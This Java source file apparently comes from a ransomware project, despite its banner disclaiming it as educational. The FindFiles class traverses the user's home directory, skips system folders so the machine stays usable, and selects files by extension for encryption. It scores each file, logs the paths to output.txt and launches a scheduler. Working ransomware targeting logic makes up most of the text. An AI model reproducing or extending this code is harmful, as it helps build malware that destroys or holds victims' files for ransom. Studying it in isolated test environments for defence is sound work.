/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
   __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


Copyright (c) 2019 Kyra Mozley
Created on 18/07/19
Version 2.0

Disclaimer: This project is purely for educational purposes 
DO NOT RUN THIS ON YOUR PERSONAL MACHINE
EXECUTE ONLY IN A TEST ENVIRONMENT
DO NOT USE FOR MALICIOUS ACTIVITY 

 *********************************************************************/
package RansomeWare;


import java.io.*;
import java.io.File;
import java.util.*;


public class FindFiles {
    BufferedWriter fileWriter;

    //List of filetypes we want to encrypt
    List<String> allowedFiles;
    List<String> avoidDir;

    FileScore fs;


    public void FindFiles() throws Exception {
        fs = new FileScore();
        //Use System Property rather than C:\\ to make it OS independent

        String home = System.getProperty("user.home");

        //Creating a file to write the files found into
        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "output.txt", false);
        fileWriter = new BufferedWriter(writer);

        //List of allowed files
        allowedFiles = new FileTypes().AllowedTypes;
        avoidDir = new AvoidedDir().avoidDir;

        //Traverse the file system
        traverse(home);
        fileWriter.close();

        //launch scheduler
        Scheduler s = new Scheduler();
        s.function();
    }

    public void traverse(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if (f.isDirectory()) {
                String name = f.getName();
                if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
                traverse(f.getAbsolutePath());

            } else {
                //split to get file extension
                int index = f.getName().lastIndexOf(".");
                String fileType = f.getName().substring(index + 1);

                //if file extension is allowed, write to file with last mod
                if(allowedFiles.contains("." + fileType.toUpperCase())) {
                    double beta = fs.calculateBeta(f);
                    fileWriter.write(f.getAbsolutePath() + ", " + beta);
                    fileWriter.newLine();
                }
            }
        }
    }

}
